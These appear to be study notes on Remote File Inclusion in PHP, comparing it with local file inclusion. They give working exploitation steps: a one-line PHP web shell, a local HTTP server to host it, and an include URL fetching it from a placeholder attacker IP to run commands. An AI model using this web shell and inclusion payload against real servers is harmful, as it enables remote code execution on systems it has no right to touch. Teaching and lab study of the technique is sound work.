# Remote File Inclusion (RFI) – Notes

## 1. Introduction

RFI allows inclusion of remote files instead of local files.

---

## 2. LFI vs RFI

| LFI | RFI |
|-----|-----|
| Local files | Remote files |
| File read | Code execution |

---

## 3. Requirement

```
allow_url_include = On
```

---

## 4. Verify RFI

```
?language=http://127.0.0.1/index.php
```

---

## 5. Exploitation Steps

### Step 1: Create shell
```
<?php system($_GET["cmd"]); ?>
```

### Step 2: Host it
```
python3 -m http.server 8000
```

### Step 3: Include it
```
?language=http://<ATTACKER_IP>:8000/shell.php&cmd=id
```

---

## 6. Protocols

### HTTP
```
http://IP/shell.php
```

### FTP
```
ftp://IP/shell.php
```

### SMB (Windows)
```
\\IP\share\shell.php
```

---

## 7. Key Takeaways

- RFI leads to direct RCE
- Requires allow_url_include enabled
- More powerful than LFI
